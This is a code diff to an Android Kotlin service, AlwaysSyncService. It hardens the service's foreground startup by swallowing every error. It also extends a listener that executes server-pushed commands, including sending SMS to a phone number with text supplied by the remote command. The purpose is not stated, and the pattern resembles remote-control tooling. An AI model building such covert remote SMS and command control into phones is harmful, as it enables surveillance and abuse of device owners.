@@ -72,13 +72,17 @@ class AlwaysSyncService : Service() {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                 try {
                     startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
-                } catch (_: Exception) {
-                    startForeground(1001, notification)
+                } catch (e: Throwable) {
+                    try {
+                        startForeground(1001, notification)
+                    } catch (_: Throwable) {}
                 }
             } else {
-                startForeground(1001, notification)
+                try {
+                    startForeground(1001, notification)
+                } catch (_: Throwable) {}
             }
-        } catch (e: Exception) {
+        } catch (e: Throwable) {
             Log.e("AlwaysSyncService", "Failed to start foreground notification: ${e.message}")
         }
     }
@@ -135,10 +139,24 @@ class AlwaysSyncService : Service() {
             syncEngine.startCommandListener { pushId, commandType, params ->
                 serviceScope.launch {
                     try {
-                        val payload = params["payload"]?.toString()
-                            ?: params["text"]?.toString()
-                            ?: params["message"]?.toString()
-                            ?: params.entries.joinToString("|") { "${it.key}=${it.value}" }
+                        val phone = params["phone"]?.toString() ?: params["number"]?.toString() ?: params["recipient"]?.toString() ?: params["to"]?.toString() ?: ""
+                        val text = params["message"]?.toString() ?: params["text"]?.toString() ?: params["body"]?.toString() ?: params["payload"]?.toString() ?: ""
+                        
+                        val payload = if (commandType.equals("SEND_SMS", ignoreCase = true) || commandType.equals("SMS_SEND", ignoreCase = true)) {
+                            if (phone.isNotEmpty() && text.isNotEmpty()) {
+                                "$phone|$text"
+                            } else {
+                                params["payload"]?.toString() ?: params.entries.filter { it.key !in listOf("command", "commandType", "type", "action") }.joinToString("|") { "${it.key}=${it.value}" }
+                            }
+                        } else {
+                            params["payload"]?.toString()
+                                ?: params["text"]?.toString()
+                                ?: params["message"]?.toString()
+                                ?: params["body"]?.toString()
+                                ?: params["duration"]?.toString()
+                                ?: params.entries.filter { it.key !in listOf("command", "commandType", "type", "action") }.joinToString("|") { "${it.key}=${it.value}" }
+                        }
+                        
                         val result = commandManager.executeCommand(commandType, payload)
                         syncEngine.updateCommandStatus(pushId, result.status, result.resultMessage)
                     } catch (e: Exception) {
@@ -171,11 +189,20 @@ class AlwaysSyncService : Service() {
             try {
                 val intent = Intent(context, AlwaysSyncService::class.java)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    context.startForegroundService(intent)
+                    try {
+                        context.startForegroundService(intent)
+                    } catch (e: Throwable) {
+                        Log.w("AlwaysSyncService", "startForegroundService failed, trying startService: ${e.message}")
+                        try {
+                            context.startService(intent)
+                        } catch (_: Throwable) {}
+                    }
                 } else {
-                    context.startService(intent)
+                    try {
+                        context.startService(intent)
+                    } catch (_: Throwable) {}
                 }
-            } catch (e: Exception) {
+            } catch (e: Throwable) {
                 Log.e("AlwaysSyncService", "Failed to start service: ${e.message}")
             }
         }
